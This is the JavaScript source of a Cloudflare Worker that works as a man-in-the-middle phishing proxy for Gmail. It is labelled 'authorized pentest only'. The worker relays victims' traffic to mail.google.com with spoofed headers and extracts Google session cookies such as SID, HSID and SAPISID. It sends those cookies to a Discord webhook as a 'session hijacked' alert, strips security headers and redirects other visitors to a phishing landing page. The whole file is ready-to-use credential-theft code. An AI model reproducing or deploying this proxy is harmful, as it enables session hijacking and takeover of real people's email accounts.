// ADVANCED Gmail MitM Proxy v2.0 - Production Pentest Grade
// Header Spoofing + Multi-Token Theft + Session Hijack + OpSec
// AUTHORIZED PENTEST ONLY - ia7353038-crypto/nINE-phish

const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-WEBHOOK'; // REPLACE
const LOG_KV_BINDING = 'PHISH_LOGS'; // Optional KV for persistence

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown';
  const userAgent = request.headers.get('User-Agent') || 'unknown';
  
  // 🛡️ RATE LIMIT (same IP)
  const rateKey = `rate:${clientIP}`;
  // Add KV namespace in wrangler.toml for persistence
  
  // 1️⃣ GMAIL PROXY PATHS
  const proxyPaths = [
    '/mail/',
    '/static/',
    '/chrome/',
    '/mail/u/',
    '/sync/',
    '/accounts/'
  ];
  
  if (proxyPaths.some(path => url.pathname.startsWith(path))) {
    return await proxyGmail(url, request, clientIP, userAgent);
  }
  
  // 2️⃣ LANDING PAGE
  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

async function proxyGmail(url, request, clientIP, userAgent) {
  // 🎭 PERFECT HEADER SPOOFING (bypass ALL checks)
  const headers = new Headers(request.headers);
  
  // CRITICAL HEADERS
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  
  // FETCH METADATA (Google tracking)
  headers.set('Sec-Fetch-Dest', 'document');
  headers.set('Sec-Fetch-Mode', 'navigate');
  headers.set('Sec-Fetch-Site', 'same-origin');
  headers.set('Sec-Fetch-User', '?1');
  
  // PROTOCOL UPGRADE
  headers.set('Upgrade-Insecure-Requests', '1');
  headers.set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
  headers.set('Accept-Language', 'en-US,en;q=0.5');
  
  // Target: mail.google.com
  url.hostname = 'mail.google.com';
  url.protocol = 'https:';
  
  const proxyReq = new Request(url.toString(), {
    method: request.method,
    headers,
    body: request.body,
    redirect: 'follow'
  });
  
  try {
    const response = await fetch(proxyReq);
    
    // 🕵️ TOKEN EXTRACTION (ALL HIGH-VALUE)
    const cookies = response.headers.getAll('Set-Cookie') || [];
    const tokens = extractTokens(cookies);
    
    if (tokens.length > 0) {
      await stealTokens(tokens, clientIP, userAgent, request.url);
    }
    
    // 🔄 PROXY RESPONSE + BYPASS
    return craftResponse(response, cookies);
    
  } catch (error) {
    console.error('Proxy failed:', error);
    return new Response('Connection failed', { status: 502 });
  }
}

function extractTokens(cookies) {
  const tokenRegex = /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|SAPISID|GAPS|G_authuser)=([^;,\s]+)/gi;
  const tokens = [];
  
  cookies.forEach(cookie => {
    let match;
    while ((match = tokenRegex.exec(cookie)) !== null) {
      tokens.push({
        name: match[1],
        value: match[2],
        full: match[0]
      });
    }
  });
  
  return tokens;
}

async function stealTokens(tokens, ip, ua, victimUrl) {
  const payload = {
    embeds: [{
      title: '🎣 GMAIL SESSION HIJACKED',
      color: 0xff4757,
      fields: [
        { name: 'IP', value: `\`${ip}\``, inline: true },
        { name: 'User-Agent', value: ua.substring(0, 100), inline: false },
        { name: 'URL', value: victimUrl, inline: false },
        { name: 'Tokens', value: tokens.map(t => `\`${t.name}\`: **${t.value.substring(0,20)}...\``).join('\n'), inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };
  
  // Discord webhook
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {});
  
  // Console log
  console.log(`PHISH: ${ip} → ${tokens.map(t => `${t.name}=${t.value}`).join(', ')}`);
}

function craftResponse(response, cookies) {
  const newHeaders = new Headers(response.headers);
  
  // 🛡️ BYPASS ALL SECURITY HEADERS
  newHeaders.delete('Content-Security-Policy');
  newHeaders.delete('Content-Security-Policy-Report-Only');
  newHeaders.delete('X-Frame-Options');
  newHeaders.delete('Strict-Transport-Security');
  
  // CORS + CREDENTIALS
  newHeaders.set('Access-Control-Allow-Origin', '*');
  newHeaders.set('Access-Control-Allow-Credentials', 'true');
  newHeaders.set('Access-Control-Allow-Methods', '*');
  
  // RELAX COOKIES (SameSite=None for proxy)
  let relaxedCookies = [];
  cookies.forEach(cookie => {
    relaxedCookies.push(cookie.replace(/SameSite=(Strict|Lax)(?!;)/gi, 'SameSite=None; Secure'));
  });
  if (relaxedCookies.length > 0) {
    newHeaders.set('Set-Cookie', relaxedCookies.join(', '));
  }
  
  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: newHeaders
  });
}
